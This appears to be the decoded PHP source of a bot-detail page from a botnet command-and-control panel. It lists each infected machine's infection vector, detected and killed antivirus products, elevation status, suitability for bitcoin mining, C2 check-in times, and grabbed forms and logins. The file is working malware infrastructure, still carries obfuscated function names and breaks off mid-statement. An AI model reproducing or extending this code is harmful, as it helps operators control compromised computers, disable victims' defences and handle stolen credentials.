<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\r\n";
require_once "include/gateway_defines.inc";
require_once "include/gateway_functionality.inc";
$sqlBots = new CClient();
$sqlBots->SetInternalLink($main_sql_link);
$botsIndex = new CClient();
$botsIndex->SetInternalLink($main_sql_link);
$sqlForms = new CFormGrab();
$sqlLogins = new CGrab();
$sqlForms->SetInternalLink($main_sql_link);
$sqlLogins->SetInternalLink($main_sql_link);
$id = isset($_GET["id"]) ? (int) $_GET["id"] : -1;
echo "<!-- 5 -->\r\n";
if ($id == -1 || !is_numeric($_GET["id"])) {
    $okid = (int) $_GET["id"];
    echo " &nbsp;Invalid ID specified. No client entry exists with the ID <i>" . $okid . "</i>";
} else {
    $bot_record_info = NULL;
    $query_result = $sqlBots->Query("SELECT * FROM " . SQL_DATABASE . ".clients WHERE id = '" . $id . "' LIMIT 1");
    if ($query_result && ($bot_record_info = mysql_fetch_assoc($query_result))) {
        $bits = array(1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536, 131072, 262144, 524288, 1048576, 2097152, 4194304, 8388608, 16777216, 33554432, 67108864, 134217728, 268435456, 536870912, 1073741824, 2147483648.0);
        $conv_install_path_toutf = false;
        $conv_compuser_name_toutf = false;
        $install_path_length = 0;
        $compuser_name_length = 0;
        $bot_clients_id = sprintf("%u", $bot_record_info["id"]);
        $status_string = $bot_record_info["ClientStatus"] == BOT_STATUS_ONLINE ? "<font color=\"#339900\">Online</font>" : "<font color=\"#E80000\">Offline</font>";
        $bot_install_source = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_BOT_SOURCE_USB ? "USB Infection" : "Spam / Exploit Pack / Other";
        $last_inforeport_date = 0 < $bot_record_info["LastInfoReport"] ? date("m/d/Y h:i:s a", $bot_record_info["LastInfoReport"]) : "<strong>Never</strong>";
        $socks_port_string = 0 < $bot_record_info["SocksPort"] ? $bot_record_info["SocksPort"] : "N/A";
        $phone_info_string = "";
        if ($bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE) {
            $phone_info_string = "Samsung (Android)";
        }
        if ($bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_APPLE_DEVICE) {
            if (strlen($phone_info_string)) {
                $phone_info_string = " <strong>/</strong> ";
            }
            $phone_info_string = "Apple (iPhone/iPad)";
        }
        if (strlen($phone_info_string) == 0) {
            $phone_info_string = "N/A";
        }
        $install_path_utf = @htmlspecialchars(@_obfuscated_0D21062D170109343714073340281F30273128043B2C22_($bot_record_info["InstallPath"]));
        $compuser_utf = @htmlspecialchars(@_obfuscated_0D21062D170109343714073340281F30273128043B2C22_($bot_record_info["CompNameUsername"]));
        $host_process_name_string = strlen($bot_record_info["HostProcessName"]) ? @htmlspecialchars($bot_record_info["HostProcessName"]) : "N/A";
        $default_browser_string = strlen($bot_record_info["DefaultBrowser"]) ? @htmlspecialchars($bot_record_info["DefaultBrowser"]) : "N/A";
        if (strtolower(str_replace("", "", $default_browser_string)) == "launcher.exe") {
            $default_browser_string .= " (Opera)";
        }
        $cpu_info_string = str_replace("", "", $bot_record_info["CpuName"]);
        $cpu_info_string = strlen($cpu_info_string) ? @htmlspecialchars($cpu_info_string) : "N/A";
        $video_info_string = str_replace("", "", $bot_record_info["VideoCardName"]);
        $video_info_string = strlen($video_info_string) ? @htmlspecialchars($video_info_string) : "N/A";
        $productid_string = str_replace("", "", $bot_record_info["ProductId"]);
        $productid_string = strlen($productid_string) ? @htmlspecialchars($productid_string) : "N/A";
        $record_clean_status_string = $bot_record_info["RecordAttributes"] & BOT_RECORD_IS_DIRTY ? "<font color=\"#E80000\">Dirty</font>" : "<font color=\"#339900\">Clean</font>";
        $favorite_status_string = $bot_record_info["RecordAttributes"] & BOT_RECORD_IS_FAVORITE ? "Favorite" : "Normal";
        $is_admin_string = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_IS_ELEVATED ? "<font color=\"#339900\">Yes</font>" : "<font color=\"#E80000\">No</font>";
        $is_bitcoin_ok_string = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_IS_GOOD_FOR_BITCOINS ? "<font color=\"#339900\">Yes</font>" : "<font color=\"#E80000\">No</font>";
        $comp_type_string = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_IS_LAPTOP ? "Laptop" : "Desktop";
        $owned_time = _obfuscated_0D351907351203383E0311143B1F363C0D183F09383D22_($bot_record_info["FirstCheckIn"], $bot_record_info["LastCheckIn"]);
        $time_since_last_checkin = _obfuscated_0D351907351203383E0311143B1F363C0D183F09383D22_($bot_record_info["LastCheckIn"], time());
        $av_string = "";
        for ($i = 0; $i < 32; $i++) {
            if ($bot_record_info["AvsInstalled"] & 1 << $i) {
                $av_string .= _obfuscated_0D0F1C3E3E150C5B2B32150B1F5B1030362B383D0E3422_($bits[$i]) . "<br />\r\n";
            }
        }
        if (!strlen($av_string)) {
            $av_string = "N/A";
        }
        $avs_actually_killed_string = "";
        if ((int) $bot_record_info["AvsKilled"] != 0) {
            for ($i = 0; $i < 32; $i++) {
                if ($bot_record_info["AvsKilled"] & 1 << $i) {
                    $avs_actually_killed_string .= _obfuscated_0D0F1C3E3E150C5B2B32150B1F5B1030362B383D0E3422_($bits[$i]) . "<br />\r\n";
                }
            }
        }
        if (!strlen($avs_actually_killed_string)) {
            $avs_actually_killed_string = "N/A";
        }
        $is_virtual_machine_string = $bot_record_info["RecordAttributes"] & BOT_RECORD_IS_VIRTUAL_MACHINE ? "<font color=\"#E80000\">Yes</font>" : "<font color=\"#339900\">No</font>";
        $softwares_string = "";
        if ((int) $bot_record_info["SoftwareInstalled"] != 0) {
            $softwares_string = "<br /><strong>Installed software:</strong><br />";
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_JAVA) {
                $softwares_string .= "Java<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_SKYPE) {
                $softwares_string .= "Skype<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_VISUAL_STUDIO) {
                $softwares_string .= "Some version of Visual Studio<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_VM_SOFTWARE) {
                $softwares_string .= "VMPlayer and/or VMWorkstation<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_ORIGIN_CLIENT) {
                $softwares_string .= "Origin gaming platform<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_ATTRIBUTE_HAS_STEAM) {
                $softwares_string .= "Steam gaming platform<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_BLIZZARD) {
                $softwares_string .= "Blizzard gaming platform<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_LEAGUE_OF_LEGENDS) {
                $softwares_string .= "League Of Legends<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_RUNESCAPE) {
                $softwares_string .= "RuneScape<br />";
            }
            if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_MINECRAFT) {
                $softwares_string .= "Minecraft<br />";
            }
            $softwares_string .= "<br />";
        }
        $exceptions_output_on = true;
        $exceptions_access_violation = (int) $bot_record_info["excp_access_violation"];
        $exceptions_priv_instruction = (int) $bot_record_info["excp_priv_instruction"];
        $exceptions_illegal_instruction = (int) $bot_record_info["excp_illegal_instruction"];
        $exceptions_stack_overflow = (int) $bot_record_info["excp_stack_overflow"];
        $exceptions_in_page_error = (int) $bot_record_info["excp_in_page_error"];
        $exceptions_all = (int) ($exceptions_access_violation + $exceptions_priv_instruction + $exceptions_illegal_instruction + $exceptions_stack_overflow + $exceptions_in_page_error);
        $persist_num_restores_clr = "";
        $crash_restart_font_clr = "";
        if ((int) $bot_record_info["CrashRestartCount"] <= 2) {
            $crash_restart_font_clr = "#339900";
        } else {
            if (3 <= (int) $bot_record_info["CrashRestartCount"] && (int) $bot_record_info["CrashRestartCount"] <= 16) {
                $crash_restart_font_clr = "#C3C300";
            } else {
                $crash_restart_font_clr = "#E80000";
            }
        }
        if ((int) $bot_record_info["FileRestoreCount"] <= 2) {
            $persist_num_restores_clr = "#339900";
        } else {
            if (3 <= (int) $bot_record_info["FileRestoreCount"] && (int) $bot_record_info["FileRestoreCount"] <= 16) {
                $persist_num_restores_clr = "#C3C300";
            } else {
                $persist_num_restores_clr = "#E80000";
            }
        }
        $persist_restores_string = "<font color=\"" . $persist_num_restores_clr . "\">" . (int) $bot_record_info["FileRestoreCount"] . "</font>";
        $crash_restart_count_string = "<font color=\"" . $crash_restart_font_clr . "\">" . (int) $bot_record_info["CrashRestartCount"] . "</font>";
        $bot_ip_string = @long2ip($bot_record_info["LastIP"]);
        global $sqlGeoIP;
        $geo_iso_string = "";
        $p_bot_locale_name = $bot_record_info["LocaleName"];
        if (0 < strlen($bot_record_info["Locale"])) {
            if (strlen($p_bot_locale_name) < 2) {
                $_GEO_RECORD_INFO = $sqlGeoIP->GetLocationFromIso2Code($bot_record_info["Locale"]);
                if (isset($_GEO_RECORD_INFO["COUNTRY_NAME"])) {
                    $p_bot_locale_name = $_GEO_RECORD_INFO["COUNTRY_NAME"];
                }
            }
            if (strlen($p_bot_locale_name) == 0) {
                $p_bot_locale_name = "<i>N/A</i>";
            } else {
                $p_bot_locale_name = htmlspecialchars($p_bot_locale_name);
            }
            $geo_iso_string = "<img src=\"" . $sqlGeoIP->GetFlagPath($bot_record_info["Locale"]) . "\"></img>&nbsp;" . $p_bot_locale_name . " (" . $bot_record_info["Locale"] . ")";
        } else {
            $geo_iso_string = "Unknown";
        }
        $num_forms = $sqlForms->Stats_GetTotalCapturesByClientGUID($bot_record_info["GUID"]);
        $num_logins = $sqlLogins->Stats_GetTotalLoginsByClientGUID($bot_record_info["GUID"]);
        $forms_first_five = $sqlForms->Query("SELECT * FROM " . SQL_DATABASE . ".grabbed_forms WHERE bot_guid = UNHEX('" . $bot_record_info["GUID"] . "') ORDER BY date_added LIMIT 8");
        $logins_first_five = $sqlLogins->Query("SELECT * FROM " . SQL_DATABASE . ".grabbed_logins WHERE bot_guid = UNHEX('" . $bot_record_info["GUID"] . "') ORDER BY capture_date LIMIT 8");
        $active_pane = 1;
        $ac_tag = "class=\"active\"";
        echo "<font size=\"1\" face=\"Tahoma\">\r\n<table class=\"table table-condensed\" align=\"center\" valign=\"top\" style=\"width: 1100px;\">\r\n\t<tr>\r\n\t\t<td>\r\n\t\t\t<div class=\"tabbable\">\r\n\t\t\t  <ul class=\"nav nav-tabs\">\r\n\t\t\t\t<li ";
        echo $active_pane == 1 ? $ac_tag : "";
        echo "><a href=\"#pane1\" data-toggle=\"tab\">Information</a></li>\r\n\t\t\t\t<li ";
        echo $active_pane == 2 ? $ac_tag : "";
        echo "><a href=\"#pane2\" data-toggle=\"tab\">Grabs&nbsp;&nbsp;&nbsp;</a></li>\r\n\t\t\t\t<li ";
        echo $active_pane == 3 ? $ac_tag : "";
        echo "><a href=\"#pane3\" data-toggle=\"tab\">Process list&nbsp;&nbsp;</a></li>\r\n\t\t\t\t<li ";
        echo $active_pane == 4 ? $ac_tag : "";
        echo "><a href=\"#pane4\" data-toggle=\"tab\">Autostart list&nbsp;&nbsp;</a></li>\r\n\t\t\t\t<li ";
        echo $active_pane == 5 ? $ac_tag : "";
        echo "><a href=\"#pane5\" data-toggle=\"tab\">Installed software</a></li>\r\n\t\t\t\t<li ";
        echo $active_pane == 6 ? $ac_tag : "";
        echo "><a href=\"#pane6\" data-toggle=\"tab\">Generic information&nbsp;</a></li>\r\n\t\t\t\t<!--<li ";
        echo $active_pane == 7 ? $ac_tag : "";
        echo "><a href=\"#pane7\" data-toggle=\"tab\">Debug information&nbsp;&nbsp;&nbsp;</a></li>-->\r\n\t\t\t  </ul>\r\n\t\t\t  <div class=\"tab-content\">\r\n\t\t\t\t<div id=\"pane1\" class=\"tab-pane ";
        echo $active_pane == 1 ? "active" : "";
        echo "\">\r\n\t\t\t\t\t<!-- Client information -->\r\n\t\t\t\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t<font size=\"2\" face=\"Tahoma\"><strong>Bot information for <i>";
        echo $bot_ip_string;
        echo "</i></strong></font><br /><br />\r\n\t\t\t\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"left\" valign=\"top\" style=\"width: 1100px;\">\r\n\t\t\t\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Status:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $status_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Bot GUID:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo strtoupper(@bin2hex($bot_record_info["GUID"]));
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Operating system:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $botsIndex->GetFullOsStringFromMask($bot_record_info["OS"], true);
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Owned bot for:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $owned_time;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>First CheckIn:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo date("m/d/Y h:i:s a", $bot_record_info["FirstCheckIn"]);
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Last CheckIn:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo date("m/d/Y h:i:s a", $bot_record_info["LastCheckIn"]) . " &nbsp;&nbsp;<i>(Bot last contacted C2 server " . $time_since_last_checkin . " ago)</i>";
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>IP Address:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo "<a target=\"_blank\" href=\"http://www.whois.net/ip-address-lookup/" . $bot_ip_string . "\">" . $bot_ip_string . "</a>";
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Country:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $geo_iso_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Detected AntiVirus(es):</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $av_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Killed AntiVirus(es):</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $avs_actually_killed_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Install path:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $install_path_utf;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Host Process Name:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $host_process_name_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Default Browser File Name:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $default_browser_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Computer/User Name(s):</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $compuser_utf;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>CPU Name:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $cpu_info_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>VideoCard Name:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $video_info_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Windows ProductId:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $productid_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Is Virtual Machine:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $is_virtual_machine_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Task dirty status:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $record_clean_status_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Is marked as favorite:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $favorite_status_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Comments:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo strlen($bot_record_info["Comments"]) ? htmlspecialchars($bot_record_info["Comments"]) : "N/A" . "<br /><br />";
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Exceptions:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t0 &nbsp;Access violation(s)<br />\r\n0 &nbsp;Privileged instruction exception(s)<br />\r\n0 &nbsp;Illegal instruction exception(s)<br />\r\n0 &nbsp;Stack Overflow exception(s)<br />\r\n0 &nbsp;In Page error(s)<br />\r\n\t\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>File restore count:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $persist_restores_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Restarts due to crash:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $crash_restart_count_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Is Elevated:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $is_admin_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Has .NET Framework:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_NET_FRAMEWORK ? "Yes" : "No";
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Has Java:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_JAVA ? "Yes" : "No";
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Has used RDP:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_USED_RDP ? "Yes" : "No";
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Has phone device(s):</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $phone_info_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"18%\"><strong>Computer type:</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td width=\"72%\">";
        echo $comp_type_string;
        echo "</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t</table>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t</div>\r\n\t\t\t\t<div id=\"pane2\" class=\"tab-pane ";
        echo $active_pane == 2 ? "active" : "";
        echo "\">\r\n\t\t\t\t\t<!-- Client information -->\r\n\t\t\t\t\t<!--\r\n\t\t\t\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t<font size=\"2\" face=\"Tahoma\"><strong>Form/login grabs for <i>";
        echo $bot_ip_string;
        echo "</i></strong></font><br /><br />\r\n\t\t\t\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"left\" valign=\"top\" style=\"width: 1100px;\">\r\n\t\t\t\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t\t\t\t</table>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t\r\n\t\t\t\t\t-->\r\n\t\t\t\t\t<i>Not implemented yet</i>\r\n\t\t\t\t</div>\r\n\t\t\t\t\r\n\t\t\t\t<div id=\"pane3\" class=\"tab-pane ";
        echo $active_pane == 3 ? "active" : "";
        echo "\">\r\n\t\t\t\t\t<!-- process / autostart list -->\r\n\t\t\t\t\t\r\n\t\t\t\t\t";
        $process_list = $bot_record_info["InfoProcessList"];
        $process_array = NULL;
        $bIsOK = true;
        $bIsBad = false;
        $szTabHeaderString = "Process list for <i>" . $bot_ip_string . "</i>";
        $iLastUpdated = 0;
        $iDisplayCount = 0;
        if (strlen($process_list) < 5) {
            $bIsOK = false;
        } else {
            if (!($process_array = explode("\n", str_replace("\r", "\n", $process_list)))) {
                $bIsOK = false;
            }
        }
        if (strstr(strtolower($process_list), "<script") || strstr(strtolower($process_list), "<img")) {
            $bIsOK = false;
            $bIsBad = true;
        }
        if (_obfuscated_0D02260502393F0B3E2C39323606290A2426311C073522_($process_list, $iLastUpdated) == true) {
            $szTabHeaderString .= "&nbsp;&nbsp;<i>(Last updated: " . date("m/d/Y h:i:s a", $iLastUpdated) . ")</i>";
        }
        echo "<font size=\"2\" face=\"Tahoma\">\r\n";
        echo "\t<strong>" . $szTabHeaderString . "</strong>";
        echo "</font>\r\n<br /><br />\r\n";
        if ($bIsOK == false && $bIsBad == true) {
            echo "<font color=\"#E80000\">HTML/script tag detected inside process list data! Possible attempt to alter page. Listing halted.</font><br /><br />";
        } else {
            if ($bIsOK == false) {
                echo "No process list data has been collected yet <br /><br />";
            } else {
                echo "<table class=\"table table-bordered table-condensed table-striped\" align=\"left\" valign=\"top\" style=\"width: 1100px;\">\r\n\t<thead>\r\n\t\t<tr>\r\n\t\t\t<th width=\"6%\">#</th>\r\n\t\t\t<th width=\"7%\">PID</th>\r\n\t\t\t<th width=\"4%\">64-bit</th>\r\n\t\t\t<th width=\"5%\">Zombie</th>\r\n\t\t\t<th width=\"5%\">System</th>\r\n\t\t\t<th width=\"73%\">File Name / Path</th>\r\n\t\t</tr>\r\n\t</thead>\r\n\t<tbody>\r\n";
                for ($i = 0; $i < count($process_array); $i++) {
                    $process_id = "";
                    $process_path = "";
                    $bIsX64 = false;
                    $bIsZombie = false;
                    $bIsSystemProcess = false;
                    $bExAttribNotAvailable = false;
                    if (substr(trim($process_array[$i]), 0, 1) == "<" || substr($process_array[$i], 0, 1) == "\t") {
                        continue;
                    }
                    if (!strstr($process_array[$i], ":") && !strstr($process_array[$i], "\\") && !strstr($process_array[$i], ".")) {
                        continue;
                    }
                    if (!strstr($process_array[$i], ":::")) {
                        if (1 < substr_count($process_array[$i], ":")) {
                            $iColPos = strpos($process_array[$i], ":");
                            if ($iColPos !== false) {
                                $process_id = (int) intval(substr($process_array[$i], 0, $iColPos));
                                $process_path = substr($process_array[$i], $iColPos + 1);
                            }
                        } else {
                            $process_id = "N/A";
                            $process_path = $process_array[$i];
                        }
                        if (12 < strlen($process_id)) {
                            $process_id = substr($process_id, 0, 12);
                        }
                        if (260 < strlen($process_path)) {
                            $process_path = substr($process_path, 0, 260);
                        }
                        $bExAttribNotAvailable = true;
                    } else {
                        $entry_parts = explode(":::", $process_array[$i]);
                        $attrib_parts = NULL;
                        if ($entry_parts && 2 <= count($entry_parts)) {
                            $attrib_parts = explode(":", $entry_parts[0]);
                            $process_path = $entry_parts[1];
                            if ($attrib_parts) {
                                if (isset($attrib_parts[0])) {
                                    $process_id = (int) intval($attrib_parts[0]);
                                }
                                if (isset($attrib_parts[1]) && (int) $attrib_parts[1] != 0) {
                                    $bIsX64 = true;
                                }
                                if (isset($attrib_parts[2]) && (int) $attrib_parts[2] != 0) {
                                    $bIsZombie = true;
                                }
                                if (isset($attrib_parts[3]) && (int) $attrib_parts[3] != 0) {
                                    $bIsSystemProcess = true;
                                }
                            }
                        }
                    }
                    if ((int) $process_id == 0) {
                        $process_id = "N/A";
                    }
                    $x64_string = $bIsX64 ? "Yes" : "No";
                    $zombie_string = $bIsZombie == true ? "<font color=\"#E80000\">Yes</font>" : "<font color=\"#339900\">No</font>";
                    $system_process_string = $bIsSystemProcess ? "Yes" : "No";
                    $iExplorerPos = -1;
                    $iRealExplorerMarkerPos = -1;
                    if ($bExAttribNotAvailable == true) {
                        $x64_string = "<i>N/A</i>";
                        $zombie_string = "<i>N/A</i>";
                        $system_process_string = "<i>N/A</i>";
                    }
                    $process_path = htmlspecialchars($process_path);
                    if (($iExplorerPos = stripos($process_path, "\\explorer.exe")) !== false && 0 <= $iExplorerPos && $iExplorerPos + strlen("\\explorer.exe") - 1 <= ($iRealExplorerMarkerPos = stripos($process_path, " (IRE+)"))) {
